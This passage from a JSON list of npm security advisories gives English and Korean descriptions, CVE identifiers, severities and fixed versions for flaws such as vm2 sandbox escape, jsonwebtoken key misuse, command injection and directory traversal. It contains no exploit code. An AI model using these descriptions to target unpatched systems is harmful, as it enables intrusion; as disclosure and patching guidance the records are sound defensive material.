    "descriptionKR": "Json2html은 jQuery와 Node.js 모두에 대한 래퍼가 포함된 클라이언트 측 자바스크립트 HTML 템플릿 라이브러리입니다. moappi Json2html 1.1.x 까지 취약점이 발견되어 문제가 있는 것으로 분류되었습니다. 이 문제는 json2html.js 파일의 일부 알려지지 않은 처리에 영향을 미칩니다. 조작은 교차 사이트 스크립팅으로 이어집니다. 공격은 원격으로 시작될 수 있습니다. 버전 1.2.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 2d3d24d971b19a8ed1fb823596300b9835d55801입니다. 이 취약점의 관련 식별자는 VDB-216959입니다."
  },
  {
    "description": "The package liquidjs before 10.0.0 is vulnerable to Information Exposure when `ownPropertyOnly` parameter is set to `False`, which results in leaking properties of a prototype. Workaround For versions 9.34.0 and higher, an option to disable this functionality is provided.",
    "identifiers": "GHSA : GHSA-45rm-2893-5f49\nCVE : CVE-2022-25948",
    "severity": "MODERATE",
    "updatedAt": "2023-02-02T05:06:58Z",
    "publishedAt": "2022-12-22T06:30:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25948\nhttps://github.com/harttle/liquidjs/issues/454\nhttps://github.com/harttle/liquidjs/commit/7e99efc5131e20cf3f59e1fc2c371a15aa4109db\nhttps://github.com/harttle/liquidjs/commit/7eb621601c2b05d6e379e5ce42219f2b1f556208\nhttps://groups.google.com/u/0/a/snyk.io/g/report/c/9ipXecWRtTM/m/IgLadevtCQAJ\nhttps://security.snyk.io/vuln/SNYK-JS-LIQUIDJS-2952868\nhttps://github.com/advisories/GHSA-45rm-2893-5f49",
    "name": "liquidjs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 10.0.0",
    "identifier": "10.0.0",
    "descriptionKR": "10.0.0 이전의 패키지 liquidjs는 `ownPropertyOnly` 매개변수가 `False`로 설정되어 프로토타입의 속성이 누출되는 정보 노출에 취약합니다. 해결 방법 버전 9.34.0 이상에서는 이 기능을 비활성화하는 옵션이 제공됩니다."
  },
  {
    "description": "A vulnerability was found in LinkedIn dustjs prior to version 3.0.0 and classified as problematic. Affected by this issue is some unknown functionality. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). The attack may be launched remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 3.0.0 can address this issue. The name of the patch is ddb6523832465d38c9d80189e9de60519ac307c3. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-216464.",
    "identifiers": "GHSA : GHSA-c6rp-wrp9-qr4q\nCVE : CVE-2021-4264",
    "severity": "HIGH",
    "updatedAt": "2023-01-28T05:06:44Z",
    "publishedAt": "2022-12-21T21:30:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4264\nhttps://github.com/linkedin/dustjs/issues/804\nhttps://github.com/linkedin/dustjs/pull/805\nhttps://github.com/linkedin/dustjs/commit/ddb6523832465d38c9d80189e9de60519ac307c3\nhttps://vuldb.com/?id.216464\nhttps://github.com/linkedin/dustjs/releases/tag/v3.0.0\nhttps://vuldb.com/?ctiid.216464\nhttps://github.com/advisories/GHSA-c6rp-wrp9-qr4q",
    "name": "dustjs-linkedin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.0",
    "identifier": "3.0.0",
    "descriptionKR": "버전 3.0.0 이전의 LinkedIn dustjs에서 취약점이 발견되어 문제가 있는 것으로 분류되었습니다. 일부 알 수 없는 기능이 이 문제의 영향을 받습니다. 조작은 개체 프로토타입 속성의 부적절하게 제어된 수정으로 이어집니다('프로토타입 오염'). 공격은 원격으로 시작할 수 있습니다. 익스플로잇은 대중에게 공개되었으며 사용될 수 있습니다. 버전 3.0.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치의 이름은 ddb6523832465d38c9d80189e9de60519ac307c3입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 이 취약점의 식별자는 VDB-216464입니다."
  },
  {
    "description": "The package vm2 before 3.9.10 is vulnerable to Arbitrary Code Execution due to the usage of prototype lookup for the WeakMap.prototype.set method. Exploiting this vulnerability leads to access to a host object and a sandbox compromise.",
    "identifiers": "GHSA : GHSA-4w2j-2rg4-5mjw\nCVE : CVE-2022-25893",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:01:02Z",
    "publishedAt": "2022-12-21T06:30:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25893\nhttps://github.com/patriksimek/vm2/issues/444\nhttps://github.com/patriksimek/vm2/pull/445\nhttps://github.com/patriksimek/vm2/pull/445/commits/3a9876482be487b78a90ac459675da7f83f46d69\nhttps://security.snyk.io/vuln/SNYK-JS-VM2-2990237\nhttps://github.com/advisories/GHSA-4w2j-2rg4-5mjw",
    "name": "vm2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.9.10",
    "identifier": "3.9.10",
    "descriptionKR": "3.9.10 이전 vm2 패키지는 WeakMap.prototype.set 메소드에 대한 프로토타입 조회 사용으로 인해 임의 코드 실행에 취약합니다. 이 취약점을 악용하면 호스트 개체에 대한 액세스 및 샌드박스 손상으로 이어집니다."
  },
  {
    "description": "# Overview\n\nVersions `<=8.5.1` of `jsonwebtoken` library can be misconfigured so that passing a poorly implemented key retrieval function (referring to the `secretOrPublicKey` argument from the [readme link](https://github.com/auth0/node-jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback)) will result in incorrect verification of tokens. There is a possibility of using a different algorithm and key combination in verification  than the one that was used to sign the tokens. Specifically, tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm. This can lead to successful validation of forged tokens. \n\n# Am I affected?\n\nYou will be affected if your application is supporting usage of both symmetric key and asymmetric key in jwt.verify() implementation with the same key retrieval function. \n\n# How do I fix it?\n \nUpdate to version 9.0.0.\n\n# Will the fix impact my users?\n\nThere is no impact for end users",
    "identifiers": "GHSA : GHSA-hjrf-2m68-5959\nCVE : CVE-2022-23541",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:06:34Z",
    "publishedAt": "2022-12-22T03:33:19Z",
    "references": "https://github.com/auth0/node-jsonwebtoken/security/advisories/GHSA-hjrf-2m68-5959\nhttps://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-23541\nhttps://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0\nhttps://github.com/advisories/GHSA-hjrf-2m68-5959",
    "name": "jsonwebtoken",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 8.5.1",
    "identifier": "9.0.0",
    "descriptionKR": "# 개요\n\n`jsonwebtoken` 라이브러리의 `<=8.5.1` 버전은 제대로 구현되지 않은 키 검색 기능을 전달하도록 잘못 구성될 수 있습니다([readme 링크](https://github.com/auth0/의 `secretOrPublicKey` 인수 참조) node-jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback)) 토큰을 잘못 확인하게 됩니다. 토큰 서명에 사용된 것과 다른 알고리즘 및 키 조합을 검증에 사용할 가능성이 있습니다. 특히 비대칭 공개 키로 서명된 토큰은 대칭 HS256 알고리즘으로 확인할 수 있습니다. 이것은 위조된 토큰의 성공적인 검증으로 이어질 수 있습니다.\n\n# 영향을 받나요?\n\n애플리케이션이 동일한 키 검색 기능을 사용하여 jwt.verify() 구현에서 대칭 키와 비대칭 키의 사용을 모두 지원하는 경우 영향을 받습니다.\n\n# 어떻게 고칠 수 있나요?\n \n버전 9.0.0으로 업데이트하십시오.\n\n# 수정 사항이 내 사용자에게 영향을 미칩니까?\n\n최종 사용자에게는 영향이 없습니다."
  },
  {
    "description": "# Overview\n\nVersions `<=8.5.1` of `jsonwebtoken` library could be misconfigured so that legacy, insecure key types are used for signature verification. For example, DSA keys could be used with the RS256 algorithm. \n\n# Am I affected?\n\nYou are affected if you are using an algorithm and a key type other than the combinations mentioned below\n\n| Key type |  algorithm                                    |\n|----------|------------------------------------------|\n| ec           | ES256, ES384, ES512                      |\n| rsa          | RS256, RS384, RS512, PS256, PS384, PS512 |\n| rsa-pss  | PS256, PS384, PS512                      |\n\nAnd for Elliptic Curve algorithms:\n\n| `alg` | Curve      |\n|-------|------------|\n| ES256 | prime256v1 |\n| ES384 | secp384r1  |\n| ES512 | secp521r1  |\n\n# How do I fix it?\n\nUpdate to version 9.0.0. This version validates for asymmetric key type and algorithm combinations. Please refer to the above mentioned algorithm / key type combinations for the valid secure configuration. After updating to version 9.0.0, If you still intend to continue with signing or verifying tokens using invalid key type/algorithm value combinations, you’ll need to set the `allowInvalidAsymmetricKeyTypes` option  to `true` in the `sign()` and/or `verify()` functions.\n\n# Will the fix impact my users?\n\nThere will be no impact, if you update to version 9.0.0 and you already use a valid secure combination of key type and algorithm. Otherwise,  use the  `allowInvalidAsymmetricKeyTypes` option  to `true` in the `sign()` and `verify()` functions to continue usage of invalid key type/algorithm combination in 9.0.0 for legacy compatibility. \n\n",
    "identifiers": "GHSA : GHSA-8cf7-32gw-wr33\nCVE : CVE-2022-23539",
    "severity": "MODERATE",
    "updatedAt": "2023-01-31T05:01:09Z",
    "publishedAt": "2022-12-22T03:32:22Z",
    "references": "https://github.com/auth0/node-jsonwebtoken/security/advisories/GHSA-8cf7-32gw-wr33\nhttps://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-23539\nhttps://github.com/advisories/GHSA-8cf7-32gw-wr33",
    "name": "jsonwebtoken",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 8.5.1",
    "identifier": "9.0.0",
    "descriptionKR": "# 개요\n\n`jsonwebtoken` 라이브러리의 `<=8.5.1` 버전은 보안되지 않은 레거시 키 유형이 서명 확인에 사용되도록 잘못 구성될 수 있습니다. 예를 들어 DSA 키는 RS256 알고리즘과 함께 사용할 수 있습니다.\n\n# 영향을 받나요?\n\n아래 언급된 조합이 아닌 다른 알고리즘과 키 유형을 사용하는 경우 영향을 받습니다.\n\n| 키 유형 | 알고리즘 |\n|----------|----------------------- ----|\n| EC | ES256, ES384, ES512 |\n| RSA | RS256, RS384, RS512, PS256, PS384, PS512 |\n| rsa-pss | PS256, PS384, PS512 |\n\n타원 곡선 알고리즘의 경우:\n\n| `알그` | 곡선 |\n|-------|------------|\n| ES256 | 프라임256v1 |\n| ES384 | secp384r1 |\n| ES512 | secp521r1 |\n\n# 어떻게 고칠 수 있나요?\n\n버전 9.0.0으로 업데이트하십시오. 이 버전은 비대칭 키 유형 및 알고리즘 조합을 검증합니다. 유효한 보안 구성을 위해 위에서 언급한 알고리즘/키 유형 조합을 참조하십시오. 버전 9.0.0으로 업데이트한 후에도 유효하지 않은 키 유형/알고리즘 값 조합을 사용하여 토큰 서명 또는 확인을 계속하려면 `sign()`에서 `allowInvalidAsymmetricKeyTypes` 옵션을 `true`로 설정해야 합니다. 및/또는 `verify()` 함수.\n\n# 수정 사항이 내 사용자에게 영향을 미칩니까?\n\n버전 9.0.0으로 업데이트하고 키 유형과 알고리즘의 유효한 보안 조합을 이미 사용하는 경우 영향이 없습니다. 그렇지 않으면 레거시 호환성을 위해 9.0.0에서 유효하지 않은 키 유형/알고리즘 조합을 계속 사용하려면 `sign()` 및 `verify()` 함수에서 `allowInvalidAsymmetricKeyTypes` 옵션을 `true`로 사용하십시오."
  },
  {
    "description": "# Overview\n\nFor versions `<=8.5.1` of `jsonwebtoken` library, if a malicious actor has the ability to modify the key retrieval parameter (referring to the `secretOrPublicKey` argument from the [readme link](https://github.com/auth0/node-jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback)) of the `jwt.verify()` function, they can gain remote code execution (RCE).\n\n# Am I affected?\n\nThis security issue is a concern when the `jsonwebtoken` library is used in an insecure way. Users are affected only if they allow untrusted entities to modify the key retrieval parameter of the `jwt.verify()` on a host that you control. In this scenario, if all the prerequisites are met, the issue may be exploitable. The source of this risk in this scenario would be in the calling code, and not in the library itself.\n\n# How do I fix it?\n\nUsers of jsonwebtoken 8.5.1 and earlier are encouraged to update to the latest version, 9.0.0, which presents safer code and important security checks that fixes this security flaw and others and prevents misuse of the package.",
    "identifiers": "GHSA : GHSA-27h2-hvpr-p74q\nCVE : CVE-2022-23529",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T21:51:56Z",
    "publishedAt": "2022-12-22T03:31:28Z",
    "withdrawnAt": "2023-01-27T21:51:55Z",
    "references": "https://github.com/auth0/node-jsonwebtoken/security/advisories/GHSA-27h2-hvpr-p74q\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-23529\nhttps://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3\nhttps://github.com/advisories/GHSA-27h2-hvpr-p74q",
    "name": "jsonwebtoken",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 8.5.1",
    "identifier": "9.0.0",
    "descriptionKR": "# 개요\n\n`jsonwebtoken` 라이브러리 버전 `<=8.5.1`의 경우 악의적인 행위자가 키 검색 매개변수를 수정할 수 있는 능력이 있는 경우([readme 링크](https://github.com의 `secretOrPublicKey` 인수 참조) /auth0/node-jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback)) `jwt.verify()` 함수의 원격 코드 실행(RCE)을 얻을 수 있습니다.\n\n# 영향을 받나요?\n\n이 보안 문제는 `jsonwebtoken` 라이브러리가 안전하지 않은 방식으로 사용될 때 우려됩니다. 사용자는 신뢰할 수 없는 엔터티가 제어하는 ​​호스트에서 `jwt.verify()`의 키 검색 매개변수를 수정하도록 허용하는 경우에만 영향을 받습니다. 이 시나리오에서 모든 전제 조건이 충족되면 문제를 악용할 수 있습니다. 이 시나리오에서 이 위험의 원인은 라이브러리 자체가 아니라 호출 코드에 있습니다.\n\n# 어떻게 고칠 수 있나요?\n\njsonwebtoken 8.5.1 이하 사용자는 최신 버전인 9.0.0으로 업데이트하는 것이 좋습니다. 이 버전은 이 보안 결함 및 기타 사항을 수정하고 패키지의 오용을 방지하는 더 안전한 코드와 중요한 보안 검사를 제공합니다."
  },
  {
    "description": "The package smoothie from 1.31.0 and before 1.36.1 are vulnerable to Cross-site Scripting (XSS) due to improper user input sanitization in strokeStyle and tooltipLabel properties. Exploiting this vulnerability is possible when the user can control these properties.",
    "identifiers": "GHSA : GHSA-g662-qq45-ppwm\nCVE : CVE-2022-25929",
    "severity": "MODERATE",
    "updatedAt": "2023-01-30T05:01:02Z",
    "publishedAt": "2022-12-21T06:30:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25929\nhttps://github.com/joewalnes/smoothie/pull/147\nhttps://github.com/joewalnes/smoothie/commit/8e0920d50da82f4b6e605d56f41b69fbb9606a98\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-3177369\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-3177368\nhttps://security.snyk.io/vuln/SNYK-JS-SMOOTHIE-3177364\nhttps://github.com/advisories/GHSA-g662-qq45-ppwm",
    "name": "smoothie",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.31.0, < 1.36.1",
    "identifier": "1.36.1",
    "descriptionKR": "1.31.0 및 1.36.1 이전의 패키지 스무디는 strokeStyle 및 tooltipLabel 속성의 부적절한 사용자 입력 삭제로 인해 XSS(교차 사이트 스크립팅)에 취약합니다. 사용자가 이러한 속성을 제어할 수 있는 경우 이 취약점을 악용할 수 있습니다."
  },
  {
    "description": "All versions of package abacus-ext-cmdline are vulnerable to Command Injection via the execute function due to improper user-input sanitization.",
    "identifiers": "GHSA : GHSA-m5v8-wpw4-rj3x\nCVE : CVE-2022-24431",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:07:16Z",
    "publishedAt": "2022-12-21T06:30:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24431\nhttps://security.snyk.io/vuln/SNYK-JS-ABACUSEXTCMDLINE-3157950\nhttps://github.com/advisories/GHSA-m5v8-wpw4-rj3x",
    "name": "abacus-ext-cmdline",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.0.6-dev.9",
    "descriptionKR": "abacus-ext-cmdline 패키지의 모든 버전은 부적절한 사용자 입력 삭제로 인해 실행 기능을 통한 명령 주입에 취약합니다."
  },
  {
    "description": "All versions of package lite-dev-server are vulnerable to Directory Traversal due to missing input sanitization and sandboxes being employed to the `req.url` user input that is passed to the server code.",
    "identifiers": "GHSA : GHSA-pppv-ch8p-rp2w\nCVE : CVE-2022-25895",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:06:49Z",
    "publishedAt": "2022-12-21T06:30:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25895\nhttps://gist.github.com/lirantal/0f8a48c3f5ac581ce73123abe9f7f120\nhttps://security.snyk.io/vuln/SNYK-JS-LITEDEVSERVER-3153718\nhttps://github.com/shadowwzw/lite-dev-server/blob/master/src/server.js#23L134\nhttps://github.com/advisories/GHSA-pppv-ch8p-rp2w",
    "name": "lite-dev-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 3.2.7",
    "descriptionKR": "lite-dev-server 패키지의 모든 버전은 서버 코드로 전달되는 `req.url` 사용자 입력에 사용되는 샌드박스 및 누락된 입력 삭제로 인해 디렉터리 탐색에 취약합니다."
  },
  {
    "description": "All versions of package safe-eval are vulnerable to Prototype Pollution which allows an attacker to add or modify properties of the Object.prototype.Consolidate when using the function safeEval. This is because the function uses vm variable, leading an attacker to modify properties of the Object.prototype.",
    "identifiers": "GHSA : GHSA-33vh-7x8q-mg35\nCVE : CVE-2022-25904",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-02T05:07:16Z",
    "publishedAt": "2022-12-20T06:30:36Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25904\nhttps://github.com/hacksparrow/safe-eval/issues/26\nhttps://security.snyk.io/vuln/SNYK-JS-SAFEEVAL-3175701\nhttps://github.com/advisories/GHSA-33vh-7x8q-mg35",
    "name": "safe-eval",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.4.1",
    "descriptionKR": "패키지 safe-eval의 모든 버전은 공격자가 safeEval 함수를 사용할 때 Object.prototype.Consolidate의 속성을 추가하거나 수정할 수 있는 Prototype Pollution에 취약합니다. 이는 함수가 vm 변수를 사용하여 공격자가 Object.prototype의 속성을 수정하도록 유도하기 때문입니다."
  },
  {
    "description": "The package p4 before 0.0.7 is vulnerable to Command Injection via the run() function due to improper input sanitization",
    "identifiers": "GHSA : GHSA-jfm8-hwhg-r6gg\nCVE : CVE-2022-25171",
    "severity": "HIGH",
    "updatedAt": "2023-01-29T05:05:46Z",
    "publishedAt": "2022-12-20T06:30:36Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25171\nhttps://github.com/natelong/p4/commit/ae42e251beabf67c00539ec0e1d7aa149ca445fb\nhttps://security.snyk.io/vuln/SNYK-JS-P4-3167330\nhttps://github.com/natelong/p4/blob/master/p4.js#23L12\nhttps://github.com/natelong/p4/blob/master/p4.js%23L12\nhttps://github.com/advisories/GHSA-jfm8-hwhg-r6gg",
    "name": "p4",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.0.7",
    "identifier": "0.0.7",
    "descriptionKR": "0.0.7 이전의 패키지 p4는 부적절한 입력 삭제로 인해 run() 함수를 통한 명령 주입에 취약합니다."
  },
  {
    "description": "All versions of package easy-static-server are vulnerable to Directory Traversal due to missing input sanitization and sandboxes being employed to the `req.url` user input that is passed to the server code.",
    "identifiers": "GHSA : GHSA-wcwm-c3mr-pxcr\nCVE : CVE-2022-25931",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:06:49Z",
    "publishedAt": "2022-12-20T06:30:36Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25931\nhttps://gist.github.com/lirantal/fdfbe26561788c8194a54bf6d31772c9\nhttps://security.snyk.io/vuln/SNYK-JS-EASYSTATICSERVER-3153539\nhttps://github.com/cunjieliu/easyServer/blob/master/index.js#23L27\nhttps://github.com/advisories/GHSA-wcwm-c3mr-pxcr",
    "name": "easy-static-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.1.1",
    "descriptionKR": "easy-static-server 패키지의 모든 버전은 서버 코드로 전달되는 `req.url` 사용자 입력에 사용되는 샌드박스 및 누락된 입력 삭제로 인해 디렉터리 탐색에 취약합니다."
  },
  {
    "description": "All versions of package lite-server are vulnerable to Denial of Service (DoS) when an attacker sends an HTTP request and includes control characters that the `decodeURI()` function is unable to parse.",
    "identifiers": "GHSA : GHSA-89w7-5q45-r53w\nCVE : CVE-2022-25940",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:07:09Z",
    "publishedAt": "2022-12-20T06:30:36Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25940\nhttps://gist.github.com/lirantal/832382155e00da92bfd8bb3adea474eb\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-3175617\nhttps://security.snyk.io/vuln/SNYK-JS-LITESERVER-3153540\nhttps://github.com/advisories/GHSA-89w7-5q45-r53w",
    "name": "lite-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.6.1",
    "descriptionKR": "lite-server 패키지의 모든 버전은 공격자가 HTTP 요청을 보내고 'decodeURI()' 함수가 구문 분석할 수 없는 제어 문자를 포함할 때 서비스 거부(DoS)에 취약합니다."
  },
  {
    "description": "A vulnerability was found in oils-js. This vulnerability affects unknown code of the file core/Web.js. The manipulation leads to open redirect and the attack can be initiated remotely. The name of the patch is fad8fbae824a7d367dacb90d56cb02c5cb999d42. It is recommended to apply a patch to fix this issue. ",
    "identifiers": "GHSA : GHSA-v279-v2xm-whq9\nCVE : CVE-2021-4260",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:07:08Z",
    "publishedAt": "2022-12-19T15:30:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4260\nhttps://github.com/mannyvergel/oils-js/commit/fad8fbae824a7d367dacb90d56cb02c5cb999d42\nhttps://vuldb.com/?id.216268\nhttps://web.archive.org/web/20211204010604/https://www.npmjs.com/package/oils\nhttps://github.com/advisories/GHSA-v279-v2xm-whq9",
    "name": "oils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 8.0.0",
    "identifier": "8.0.0",
    "descriptionKR": "oils-js에서 취약점이 발견되었습니다. 이 취약점은 core/Web.js 파일의 알 수 없는 코드에 영향을 미칩니다. 조작은 오픈 리디렉션으로 이어지고 공격은 원격으로 시작될 수 있습니다. 패치의 이름은 fad8fbae824a7d367dacb90d56cb02c5cb999d42입니다. 이 문제를 해결하려면 패치를 적용하는 것이 좋습니다."
  },
  {
    "description": "A vulnerability classified as critical has been found in Furqan node-whois. Affected is an unknown function of the file `index.coffee`. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). It is possible to launch the attack remotely. The name of the patch is 46ccc2aee8d063c7b6b4dee2c2834113b7286076. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-216252.",
    "identifiers": "GHSA : GHSA-97jv-c342-5xhc\nCVE : CVE-2020-36618",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-29T05:06:34Z",
    "publishedAt": "2022-12-19T15:30:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-36618\nhttps://github.com/FurqanSoftware/node-whois/pull/105\nhttps://github.com/FurqanSoftware/node-whois/commit/46ccc2aee8d063c7b6b4dee2c2834113b7286076\nhttps://vuldb.com/?id.216252\nhttps://web.archive.org/web/20220403104013/https://www.npmjs.com/package/whois\nhttps://github.com/advisories/GHSA-97jv-c342-5xhc",
    "name": "whois",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.13.6",
    "identifier": "2.13.6",
    "descriptionKR": "Furqan node-whois에서 치명적으로 분류된 취약점이 발견되었습니다. 영향을 받는 파일은 `index.coffee` 파일의 알 수 없는 기능입니다. 조작은 개체 프로토타입 속성의 부적절하게 제어된 수정으로 이어집니다('프로토타입 오염'). 공격을 원격으로 시작할 수 있습니다. 패치의 이름은 46ccc2aee8d063c7b6b4dee2c2834113b7286076입니다. 이 문제를 해결하려면 패치를 적용하는 것이 좋습니다. 이 취약점의 식별자는 VDB-216252입니다."
  },
  {
    "description": "A deserialization issue discovered in inikulin replicator before 1.0.4 allows remote attackers to run arbitrary code via the fromSerializable function in TypedArray object.",
    "identifiers": "GHSA : GHSA-hw46-vg6w-88fj\nCVE : CVE-2021-33420",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-29T05:01:07Z",
    "publishedAt": "2022-12-15T21:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-33420\nhttps://github.com/inikulin/replicator/issues/16\nhttps://github.com/inikulin/replicator/pull/17\nhttps://github.com/inikulin/replicator/commit/2c626242fb4a118855262c64b5731b2ce98e521b\nhttps://advisory.checkmarx.net/advisory/CX-2021-4787\nhttps://github.com/advisories/GHSA-hw46-vg6w-88fj",
    "name": "replicator",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.4",
    "identifier": "1.0.4",
    "descriptionKR": "1.0.4 이전의 inikulin replicator에서 발견된 역직렬화 문제로 인해 원격 공격자가 TypedArray 객체의 fromSerializable 함수를 통해 임의의 코드를 실행할 수 있습니다."
  },
  {
    "description": "Directory Traversal vulnerability in easywebpack-cli before 4.5.2 allows attackers to obtain sensitive information via crafted GET request.",
    "identifiers": "GHSA : GHSA-252h-2cmq-pmr6\nCVE : CVE-2020-24855",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:01:12Z",
    "publishedAt": "2022-12-15T21:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-24855\nhttps://github.com/easy-team/easywebpack-cli/issues/25\nhttps://github.com/easy-team/easywebpack-cli/commit/eb3f54603f58ea706d0c03fd6eb76c94176eae52\nhttps://github.com/advisories/GHSA-252h-2cmq-pmr6",
    "name": "@easy-team/easywebpack-cli",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.5.2",
    "identifier": "4.5.2",
    "descriptionKR": "4.5.2 이전 버전의 easywebpack-cli에 있는 디렉토리 통과 취약성은 공격자가 조작된 GET 요청을 통해 중요한 정보를 얻을 수 있도록 허용합니다."
  },
  {
    "description": "A vulnerability classified as problematic has been found in chbrown rfc6902. This affects an unknown part of the file pointer.ts. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). The exploit has been disclosed to the public and may be used. The name of the patch is c006ce9faa43d31edb34924f1df7b79c137096cf. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-215883.",
    "identifiers": "GHSA : GHSA-p495-jxh2-wrfg\nCVE : CVE-2021-4245",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-29T05:01:05Z",
    "publishedAt": "2022-12-15T21:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4245\nhttps://github.com/chbrown/rfc6902/pull/76\nhttps://github.com/chbrown/rfc6902/commit/c006ce9faa43d31edb34924f1df7b79c137096cf\nhttps://vuldb.com/?id.215883\nhttps://github.com/chbrown/rfc6902/issues/84\nhttps://github.com/advisories/GHSA-p495-jxh2-wrfg",
    "name": "rfc6902",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.0.0",
    "identifier": "5.0.0",
    "descriptionKR": "문제가 있는 것으로 분류된 취약점이 chbrown rfc6902에서 발견되었습니다. 이는 pointer.ts 파일의 알려지지 않은 부분에 영향을 미칩니다. 조작은 개체 프로토타입 속성의 부적절하게 제어된 수정으로 이어집니다('프로토타입 오염'). 익스플로잇은 대중에게 공개되었으며 사용될 수 있습니다. 패치의 이름은 c006ce9faa43d31edb34924f1df7b79c137096cf입니다. 이 문제를 해결하려면 패치를 적용하는 것이 좋습니다. 이 취약점의 관련 식별자는 VDB-215883입니다."
  },
  {
    "description": "The package cycle-import-check before version 1.3.2 is vulnerable to Command Injection via the `writeFileToTmpDirAndOpenIt` function due to improper user-input sanitization.",
    "identifiers": "GHSA : GHSA-995x-33wq-8gc9\nCVE : CVE-2022-24377",
    "severity": "CRITICAL",
    "updatedAt": "2023-08-08T22:09:46Z",
    "publishedAt": "2022-12-14T06:30:16Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24377\nhttps://github.com/Soontao/cycle-import-check/commit/1ca97b59df7e9c704471fcb4cf042ce76d7c9890\nhttps://security.snyk.io/vuln/SNYK-JS-CYCLEIMPORTCHECK-3157955\nhttps://github.com/advisories/GHSA-995x-33wq-8gc9",
    "name": "cycle-import-check",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.2",
    "identifier": "1.3.2",
    "descriptionKR": "버전 1.3.2 이전의 패키지 cycle-import-check는 부적절한 사용자 입력 삭제로 인해 `writeFileToTmpDirAndOpenIt` 기능을 통한 명령 주입에 취약합니다."
  },
  {
    "description": "# Overview\nA remote attacker can bypass WSFed authentication on a website using passport-wsfed-saml2. A successful attack requires that the attacker is in possession of an arbitrary IDP signed WSFed assertion. Depending on the IDP used, fully unauthenticated attacks (e.g without access to a valid user) might also be feasible if generation of a signed message can be triggered.\n\n# Am I affected?\nYou are affected if you are using WSFed protocol with the passport-wsfed-saml2 library versions < 4.6.3. \nSAML2 protocol is not affected. \n\n# How do I fix it?\nUpgrade the library to version 4.6.3.\n\n# Will the fix impact my users?\nNo, the fix will not impact your users. ",
    "identifiers": "GHSA : GHSA-ppjq-qxhx-m25f\nCVE : CVE-2022-23505",
    "severity": "MODERATE",
    "updatedAt": "2023-01-31T05:07:11Z",
    "publishedAt": "2022-12-13T17:16:36Z",
